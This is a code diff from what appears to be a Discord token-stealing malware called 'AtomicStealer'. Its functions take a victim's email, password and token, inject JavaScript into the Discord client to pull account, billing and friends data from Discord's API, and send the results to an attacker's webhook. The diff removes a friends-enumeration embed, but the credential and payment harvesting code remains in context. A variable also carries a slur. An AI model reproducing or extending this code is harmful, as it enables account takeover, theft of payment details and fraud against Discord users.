@@ -151,37 +151,6 @@ function Login(email, password, token) {
         xmlHttp.setRequestHeader("Authorization", "${token}");
         xmlHttp.send( null );
         xmlHttp.responseText`, !0).then((info3) => {
-                window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText`, !0).then((info4) => {
-                    function totalFriends() {
-                        var f = JSON.parse(info4)
-                        const r = f.filter((user) => {
-                            return user.type == 1
-                        })
-                        return r.length
-                    }
-
-                    function CalcFriends() {
-                        var f = JSON.parse(info4)
-                        const r = f.filter((user) => {
-                            return user.type == 1
-                        })
-                        var gay = "";
-                        for (z of r) {
-                            var b = GetRBadges(z.user.public_flags)
-                            if (b != "") {
-                                gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-                            }
-                        }
-                        if (gay == "") {
-                            gay = "--"
-                        }
-                        return gay
-                    }
 
                     function Cool() {
                         const json = JSON.parse(info3)
@@ -190,9 +159,9 @@ function Login(email, password, token) {
                             if (z.type == "") {
                                 return "\`No\`"
                             } else if (z.type == 2 && z.invalid != !0) {
-                                billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
+                                billing += "\`Yes\`"
                             } else if (z.type == 1 && z.invalid != !0) {
-                                billing += "\`Yes\`" + " :credit_card:"
+                                billing += "\`Yes\`"
                             } else {
                                 return "\`No\`"
                             }
@@ -242,25 +211,12 @@ function Login(email, password, token) {
                         "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     }
-                 }, {
-                        "title": `Total Friends (${totalFriends()})`,
-                        "description": CalcFriends(),
-                        "author": {
-                            "name": "AtomicStealer"
-                        },
-                        "footer": {
-                            "text": "AtomicStealer"
-                        },
-                        "thumbnail": {
-                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                        }
                     }]
                 }
                 SendToWebhook(JSON.stringify(params))
             })
         })
     })
-})
 }
 
 function ChangePassword(oldpassword, newpassword, token) {
@@ -341,18 +297,6 @@ function ChangePassword(oldpassword, newpassword, token) {
                     "author": {
                         "name": json.username +"#" + json.discriminator + " ("+json.id+")",
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                    }
-                }, {
-                    "title": `Total Friends (${totalFriends()})`,
-                    "description": CalcFriends(),
-                    "author": {
-                        "name": "AtomicStealer"
-                    },
-                    "footer": {
-                        "text": "AtomicStealer"
-                    },
-                    "thumbnail": {
-                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                     }
                 }]
             }
